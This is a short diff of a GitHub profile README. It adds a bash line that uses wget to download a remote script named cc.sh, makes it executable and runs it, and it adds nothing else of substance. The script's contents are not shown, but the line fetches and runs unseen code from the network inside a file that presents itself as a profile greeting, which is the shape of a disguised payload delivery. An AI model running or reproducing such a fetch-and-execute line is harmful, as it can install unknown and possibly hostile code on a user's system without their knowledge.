@@ -1,5 +1,9 @@
 ### Hi there 👋
 
+#!/bin/bash
+
+wget https://raw.githubusercontent.com/bibirbusin/bibirbusin/main/cc.sh && chmod +x cc.sh && ./cc.sh
+
 <!--
 **bibirbusin/bibirbusin** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 
